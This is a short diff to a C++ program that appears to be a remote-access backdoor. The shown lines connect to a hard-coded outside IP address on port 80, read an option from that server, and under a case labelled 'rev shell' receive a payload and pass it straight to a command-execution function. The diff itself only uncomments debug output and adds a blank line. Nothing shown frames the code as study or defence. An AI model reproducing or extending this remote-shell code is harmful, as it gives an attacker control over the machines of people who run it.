@@ -49,7 +49,7 @@ int main()
             else
             {
                 char option = receive_data(sock,"from_server.txt")[0];
-                //cout << "option: " << option << endl;
+                cout << "option: " << option << endl;
                 switch (option)
                 {
                     case '2':                                                                                     //rev shell
@@ -72,7 +72,7 @@ int main()
                         else
                         {
                             string payload = (receive_data(sock,"from_server.txt").substr(1));
-                            //cout << "Recieved after waiting ->" << payload << endl;
+                            cout << "Recieved after waiting ->" << payload << endl;
                             ExecuteCommand(payload);
                         }
                         
@@ -462,6 +462,7 @@ bool socket_setup(SOCKET &clientSocket)
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
+    
     serverAddr.sin_port = htons(80);
     serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
 
